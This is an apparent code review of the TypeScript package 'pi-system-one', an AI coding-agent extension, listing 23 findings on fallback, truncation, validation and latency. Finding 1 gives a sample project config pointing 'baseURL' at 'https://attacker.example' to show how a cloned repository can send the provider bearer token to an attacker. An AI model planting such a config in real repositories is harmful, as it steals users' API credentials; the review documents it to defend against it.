# Code review — `packages/pi-system-one`

- **Date:** 2026-09-24
- **Revision reviewed:** working tree at `ca08392` (`chore(workspace): drop unreferenced skills and legacy task/projscan/agentsmesh infra`); package version 0.7.0
- **Scope:** all 20 `src/*.ts`, `extensions/index.ts`, `bin/*`
- **Cross-checked against:** `@typesafe-ai/sdk@0.6.0` type declarations (`dist/index.d.mts`) and the installed `@earendil-works/pi-coding-agent` extension API (`dist/core/extensions/types.d.ts`)
- **Method:** single-pass review (no parallel reviewer agents; Herdr unavailable). Evidence is file:line plus read-only probes of `capState`.
- **No changes were made to any source file as part of this review.**

## Verification status

| Check | Result |
|---|---|
| `npm run check` (`tsc -b packages/pi-system-one`) | clean |
| `npm test` (`node --test --import tsx test/*.test.ts`, 21 files) | 223/223 pass, 0 fail (stable across two runs) |
| `capState` postcondition probes | see Findings 3 and 11 — measured, not inferred |

---

## High

### 1. Project-layer `baseURL` can exfiltrate the API key (no trust gating)

`src/settings.ts:147` reads `<cwd>/.pi/pi-system-one.json` unconditionally, and `baseURL`, `provider`, and `model` are all project-settable (`src/config.ts`, `LAYER_ORDER`). In `src/system-one.ts`, `applyOverrides` / `overrideAppliesTo` (`:207`, `:232`) reject only a base URL that *names the other known provider*; an arbitrary host passes, and `inferProviderFromBaseURL` returns `null` for it.

**Failure scenario.** Clone a repository containing `.pi/pi-system-one.json` with `{"provider":"typesafe","baseURL":"https://attacker.example"}`, run pi in that repository, trigger any System One request (auto routing, tool guard, gate, `/system-one test`) → the TypeSafe/OpenRouter bearer token is sent to that host.

**Blast radius.** Credential exfiltration with a known, goal-directed trigger. `model`/`provider` project overrides are comparatively harmless; `baseURL` is credential routing.

**Available mitigation, unused.** `ctx.isProjectTrusted()` and the `project_trust` event exist in the Pi API. `grep -rn "isProjectTrusted\|project_trust" src extensions bin` → 0 hits.

**Direction.** Gate the project settings layer (or at minimum a project-supplied `baseURL`) on `isProjectTrusted()`, or require one-time confirmation before honoring a project `baseURL`.

### 2. Connection/timeout failures never fall back to the healthy provider

`isProviderFallbackError` (`src/system-one.ts:354`) inspects only `error.status`. The SDK's `APIConnectionError` and `APITimeoutError` extend `TypeSafeError`, not `APIError`, and therefore carry **no** `status` (verified in `index.d.mts`) → no cross-provider fallback.

**Failure scenario.** TypeSafe DNS/TLS/proxy failure, or the endpoint being down, with OpenRouter fully configured → every System One feature fails. The SDK already exhausted its 2 retries (`maxRetries: 2`, `apiConnectionError: true`) before throwing, so the user waits through backoff and then gets nothing.

**Why this is a defect and not policy.** The `401/402/403/404` fallback set is deliberate and tested (`test/provider.test.ts:537`, `:845`; documented at `README.md:136`). Rate limits, server errors, and cancellations are explicitly excluded there. Connection errors are *not* mentioned as excluded anywhere, and the current predicate cannot distinguish them from `APIUserAbortError` — which must not fall back.

**Direction.** Add an explicit abort check (e.g. `error.name === 'APIUserAbortError'`) and treat `APIConnectionError`/`APITimeoutError` as provider-scoped and fallback-eligible.

---

## Medium

### 3. `MAX_GATE_STATE_CHARS` (48k) is not the effective gate evidence limit — 12k is

`src/gate.ts:13` caps evidence at 48,000 chars, then `capState` (`:260`) applies `MAX_STATE_FIELD_CHARS = 12_000` to the `output` field.

**Measured:** 48,000-char evidence → `output.length === 11,984`, `truncatedChars === 36,040`.

**Consequence.** Any diff or file over ~12k chars is `truncated: true`, and the prompt instructs the judge to "answer no if the criteria depend on content that may have been cut" — so large diffs effectively cannot pass. `README.md:296` advertises the 48k behaviour ("Evidence larger than `MAX_GATE_STATE_CHARS` is truncated"). The behaviour is encoded by `test/gate.test.ts:227` ("gate marks client per-field cuts as truncated"), so it is known but mis-documented.

**Direction.** Give the gate's `output` slot its own field cap, or document the effective 12k limit in README and help text.

### 4. `MAX_DESIGNED_QUESTIONS = 6` is advisory only

`src/designer.ts:10` sets the constant, the prompt asks for 1–6 (`:17`), and `README.md:140` claims "at most 10 tool candidates and 6 designed questions" — but `validateDesign` (`:46`) performs no count check. A model returning 40 questions is forwarded verbatim to a single request (context/cost blowup, likely a 4xx). Enforce the limit in `validateDesign`.

### 5. `system_one_evaluate` accepts invalid question shapes and unclamped thresholds

`src/tools.ts:179` forwards `criteria` unvalidated. The SDK requires `criteria` for `choice` and **at least two ordered levels** for `score` (`score$1(instructions, criteria)` signature, and the SDK documents `TypeSafeError` "score criteria are not a list of at least two entries"). A bad call therefore fails deep inside the SDK with an opaque message instead of a tool-level validation error.

`threshold` (`:45`, `:105`) is documented as "between 0.0 and 1.0" but never validated: `threshold: 0` additively activates *every* candidate via `applyActivation`, and `threshold: -1` does the same.

### 6. State truncation is invisible to `system_one_evaluate` callers, and can re-index arrays that questions refer to

`capState` → `shrinkStructure` (`src/system-one.ts:474`) splices the second half of the largest array and inserts a marker string in place of the cut.

Routing, guard, gate, and compaction states are string-dominated, and per-field capping runs first, so structural truncation is effectively unreachable for them. But `system_one_evaluate` takes `state: Type.Any`, so an array of many numbers or objects *can* be spliced. Questions of the form "does `state[7]` satisfy X" then address a shifted or replaced element, and the tool returns only `response.answers` (`src/tools.ts:196`) — no `truncatedChars` / `truncatedItems`. Only the global session `stats` records the cut, which the calling agent never sees.

**Direction.** Surface truncation counts in the tool result (and in `RouterResult`/`SkillRouterResult` summaries), and consider refusing structural truncation when the caller supplied index-addressed questions.

### 7. `determineTopology` trusts a raw argmax with no confidence gate

`src/orchestrator.ts:59` reads `answers['topology'].value` and accepts it if it is one of four strings. Every other decision path in this package is threshold-gated (0.65 routing, 0.85 guard, 0.55 compaction) or explicitly low-confidence-skipped (auto-model), yet a coin-flip choice here spawns a 2–3 agent workflow that then blocks the turn (`extensions/index.ts:194`, RPC timeout 10s at `orchestrator.ts:220`).

**Direction.** Use `confidence` / `distribution`, or fall through to `classifyTopologyFallback` below a cutoff.

### 8. `ToolRouter` reads a field that does not exist on `ToolInfo` (`promptSnippet`)

`pi.getAllTools()` returns `Pick<ToolDefinition, "name" | "description" | "parameters" | "promptGuidelines"> & { sourceInfo }` — there is **no** `promptSnippet`. So `src/router.ts:85` is always `undefined`, the lexical text at `:109` is name + description only, and `ToolMetadata.promptSnippet` is dead weight shipped into the judge's state. The `(t: any)` cast at `:83` is what hides it from the compiler. `promptGuidelines` does exist and would give the shortlist real signal.

### 9. Blocking latency has no bound on the tool-call path

`getClient` (`src/system-one.ts:735`) never sets the SDK `timeout`. Defaults are 10s per attempt, `maxRetries: 2`, and `respectRetryAfter` honored up to 60s. Combined with Finding 2 (no fallback on timeout), a slow provider can block `ToolGuard`'s `tool_call` hook — on the critical path of *every* tool call — for tens of seconds before returning. `checkToolCall` / `enhanceErrorResult` pass `ctx.signal` but impose no budget of their own.

### 10. `ToolRouter` swallows evaluation failures with no diagnosis

`src/router.ts:247` and `:250` set `fallbackUsed = true` and discard the error. `RouterResult` has no error field, so the tool summary (`src/tools.ts:71`) says only "local heuristic shortlist used due to System One unconfigured/offline" — identical wording for a rate limit, a rejected key, and an abort. The user and the calling model cannot distinguish "offline" from "misconfigured".

### 11. `capState` violates its documented postcondition for small caps

The docstring promises `JSON.stringify(value).length <= maxChars`, throwing when even that is impossible. The string branch (`:565`) has no post-check, and `cut` (`:440`) reserves `MARKER_BUDGET = 40` via `Math.max(0, max - 40)`.

**Measured:** `capState('x'.repeat(100), 10)` → `"…[truncated 100 chars]"` (24 chars), no throw.

Unreachable in production today (caps are 48k/60k), but it is a latent contract break for any future caller with a tighter budget.

### 12. `SystemOneSessionStats` is unguarded shared mutable state

`evaluate` clears `this.stats.fallback = undefined` at entry (`:796`) and mutates counters and `lastError` at exit; `stats` is the same object exposed by `status()` and the settings TUI. Two overlapping requests (sibling tool calls in one batch, or `TestConnectivitySubmenu` during an auto route) can clear each other's `fallback` and interleave `lastError`, making the documented "last request" semantics wrong. Low blast radius, but it is user-visible in `/system-one status`.

### 13. `getConfig()` performs synchronous filesystem I/O on every call, uncached

`resolveSystemOneProvider` → `readSecretFile` does `existsSync` + `readFileSync` per provider. `getConfig()` is reached from `isConfigured()`, which `ToolGuard` calls on **every** `tool_call` and `tool_result` (`src/tool-guard.ts:104`, `:120`), plus every `renderHealth` and status render. Individually cheap; collectively avoidable, since configuration is effectively immutable per session.

**Direction.** Cache the resolved config and invalidate on `setProviderOverrides` / `setApiKey` (and on an explicit env-change signal if one is ever needed).

---

## Low

| # | Finding | Location |
|---|---|---|
| 14 | Gate threshold is unvalidated and leniently parsed: `-p 5` silently always-fails, `-p 0` always-passes, `parseFloat('0.7x')` → 0.7, unknown flags silently ignored | `src/gate.ts:51-70` |
| 15 | `process.exit()` immediately after `console.log` can truncate piped stdout (`--json` output) | `bin/system-one-gate-runner.ts` |
| 16 | Compaction "summary" embeds raw `JSON.stringify(entry)` per kept entry — JSON, not prose; size bounded only by the 60k request cap | `src/compact.ts:117` |
| 17 | `TestConnectivitySubmenu` / `LayaHealthSubmenu` issue requests with no `AbortSignal`, so they keep running after the overlay closes | `src/settings-ui.ts` |
| 18 | Orchestrator RPC: if `events.emit` throws, the 10s timer and listener stay registered; `installCompletionNotice` is registered even when orchestration is disabled | `src/orchestrator.ts:214-241` |
| 19 | `extractJson` takes first `{` … last `}`; prose containing braces breaks parsing, with no repair or retry | `src/designer.ts:22` |
| 20 | Guard guidance silently no-ops on any casing/whitespace variance in the `choice` value (`cause === 'missing_file'`) | `src/tool-guard.ts` |
| 21 | `writeSettingsFile`: `${pid}.tmp` collides if two writes race, `mode: 0o600` is ignored when the temp file already exists, no `fsync` before rename | `src/config-store.ts:83` |
| 22 | Auto-dispatch is high-recall: the bare word `parallel` triggers a multi-agent workflow with no confirmation | `extensions/index.ts:18` |
| 23 | Auto-model has no hysteresis — alternating fast/reasoning prompts switch the model back and forth, thrashing prompt caches; the cost term `cost * -0.01` moves a 100× cheaper model by ~1 point, i.e. effectively dead weighting | `src/model-router.ts:67`, `:130` |

---

## Verified correct (so absence above is meaningful)

- **Pi API usage is type-correct and semantically right.** `ToolInfo.parameters` exists, so `describeTool` works; `ToolCallEventResult.block`/`reason` and `ToolResultEventResult.content` are the right shapes; `ExtensionContext.cwd` and `.sessionManager` genuinely exist (the `as { cwd?: string }` casts are redundant, not masking a bug); `BeforeAgentStartEventResult.message` matches the declared `Pick<CustomMessage, ...>`.
- **Skill discovery.** `SlashCommandSource` includes `"skill"`, `cmd.sourceInfo.path` and `Skill.filePath` are real fields, and the `skill:` prefix handling (`src/skills.ts:96`) matches how Pi names skill commands.
- **Question/state wiring is consistent.** `inspect: tools[i]` indices always match the `state.tools` array passed in the same request (`router.ts`, `skills.ts`, `auto.ts` `buildCombinedRequest`). The `coverage__` namespace cannot collide with `tool__` / `skill__` ids, as documented.
- **SDK contract.** `systemOne(body, { signal })` is the correct signature. `NoulResponse.noul` is a number 0–1, so `compact.ts`'s strict `typeof probability === 'number'` check succeeds, and a missing answer correctly falls back to Pi's own compactor.
- **Secret handling matches `SECURITY.md`.** `serializeSettings` emits only `SETTING_SPECS` keys; neither the user file nor session entries can carry a key; `getKeyOrigin` / `maskedKey` expose only env-var names or the secrets path.
- **State-capping postcondition holds at production caps** across deep-nested, wide-array, wide-object, and non-serializable shapes, and is well covered by `test/state-cap.test.ts`.
- **Atomic settings writes, layered precedence/provenance, legacy `jev*` aliasing, and master-switch ordering** (master before specifics so a specific variable wins) are correct as documented.
- **Tool-guard's deterministic path check.** Correct use of resolved `cwd`, correct sibling-`write` exemption, conservative 0.85 block cutoff, and documented fail-open on evaluation error.

## Intentional-but-worth-confirming (not counted as defects)

- Fallback limited to `401/402/403/404` is explicitly documented and tested (`test/provider.test.ts:537`, `:845`). The concern is only the connection-error blind spot in Finding 2.
- Tool-guard fail-open on evaluation error is deliberate and commented. Combined with Finding 9, it means a hung provider delays rather than blocks a call.
- Framework `any` casts at the Pi/SDK boundary (`params: any`, `(t: any)`, `raw: any`) are pragmatic, but they are exactly what allowed Finding 8 to hide.

## Suggested fix order

1. **Finding 1** — project-trust gating on `baseURL` (security).
2. **Finding 2** + **Finding 9** — fallback predicate and an explicit per-call timeout; one change in `getClient`, one in `isProviderFallbackError`.
3. **Finding 3** (gate cap mismatch produces wrong verdicts) and **Findings 4/5** (input validation on the public tool and designer surfaces).
4. **Finding 6** (truncation visibility), **Finding 7** (topology confidence), **Finding 8** (`promptSnippet`).
5. **Findings 10–13** (diagnostics and per-call cost), then the Low table.
